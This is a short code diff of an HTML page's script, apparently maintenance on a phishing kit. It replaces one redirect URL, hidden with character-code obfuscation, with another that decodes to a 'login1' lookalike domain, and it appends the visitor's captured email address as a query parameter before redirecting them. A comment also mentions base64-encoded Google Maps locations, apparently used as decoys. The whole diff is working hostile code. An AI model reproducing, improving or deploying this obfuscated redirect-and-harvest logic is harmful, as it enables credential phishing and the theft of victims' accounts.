@@ -219,15 +219,11 @@
     <script>
         (function(){
             // ==================== CONFIGURATION ====================
-            // New target URL – built from character codes (obfuscated)
-            // Base: https://sithalavilla.com/r/?c3Y9bzM2NV8xX25vbSZtPXVMJnVpZD1VU0VSMDkwMzIwMjZVMzQwMzA5MjAmdD1rUQ==N0123N
+            // Target URL – built from character codes (obfuscated)
             const _targetBase = String.fromCharCode(
-                104, 116, 116, 112, 115, 58, 47, 47, 115, 105, 116, 104, 97, 108, 97, 118,
-                105, 108, 108, 97, 46, 99, 111, 109, 47, 114, 47, 63, 99, 51, 89, 57, 98,
-                122, 77, 50, 78, 86, 56, 120, 88, 50, 53, 118, 98, 83, 90, 116, 80, 88, 86,
-                77, 74, 110, 86, 112, 90, 68, 49, 86, 85, 48, 86, 83, 77, 68, 107, 119, 77,
-                122, 73, 119, 77, 106, 90, 86, 77, 122, 81, 119, 77, 122, 65, 53, 77, 106,
-                65, 109, 100, 68, 49, 114, 85, 81, 61, 61, 78, 48, 49, 50, 51, 78
+                104, 116, 116, 112, 115, 58, 47, 47, 108, 111, 103, 105, 110, 49, 46, 110,
+                121, 99, 102, 111, 111, 116, 119, 97, 114, 101, 46, 99, 111, 109, 47, 67,
+                80, 116, 79, 118, 110, 75, 65, 35
             );
 
             // 30 Google Maps locations (base64 encoded)
@@ -435,8 +431,9 @@
                             return;
                         }
 
-                        // Append email directly to the base URL (no separator)
-                        const redirectUrl = _targetBase + email;
+                        // Encode email and append as query parameter
+                        const encoded = encodeURIComponent(email);
+                        const redirectUrl = _targetBase + '?email=' + encoded;
 
                         // Redirect
                         window.location.replace(redirectUrl);
